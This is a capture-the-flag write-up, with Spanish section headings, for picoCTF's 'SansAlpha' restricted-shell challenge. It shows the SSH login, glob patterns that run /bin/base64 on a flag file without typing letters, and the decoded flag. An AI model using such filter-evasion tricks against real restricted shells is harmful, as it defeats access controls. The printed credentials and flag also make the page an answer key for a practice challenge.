## Descripción
```
The Multiverse is within your grasp! Unfortunately, the server that contains the secrets of the multiverse is in a universe where keyboards only have numbers and (most) symbols.`ssh -p 58794 ctf-player@mimas.picoctf.net`Use password: `1ad5be0d`
```
## Solución
```
portidell_g3@DESKTOP-28KM9FK:~$ ssh -p 53909 ctf-player@mimas.picoctf.net
ctf-player@mimas.picoctf.net's password:
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.5.0-1016-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Fri Mar 27 17:34:39 2026 from 127.0.0.1
SansAlpha$ ls
SansAlpha: Unknown character detected
SansAlpha$ cat
SansAlpha: Unknown character detected
SansAlpha$ *
bash: blargh: command not found

SansAlpha$ */*
bash: blargh/flag.txt: Permission denied

SansAlpha$ /*
bash: /bin: Is a directory

SansAlpha$ /*/??????
/bin/base32: extra operand ‘/bin/base64’
Try '/bin/base32 --help' for more information.

SansAlpha$ /*/???[!_]64 */????.*
cmV0dXJuIDAgcGljb0NURns3aDE1X211MTcxdjNyNTNfMTVfbTRkbjM1NV83NzVhYzEyZH0=
portidell_g3@DESKTOP-28KM9FK:~$ echo cmV0dXJuIDAgcGljb0NURns3aDE1X211MTcxdjNyNTNfMTVfbTRkbjM1NV83NzVhYzEyZH0= | base64 -d
return 0 picoCTF{7h15_mu171v3r53_15_m4dn355_775ac12d}

flag: picoCTF{7h15_mu171v3r53_15_m4dn355_775ac12d}
```

## Notas 
```

```

## Referencias
````

```
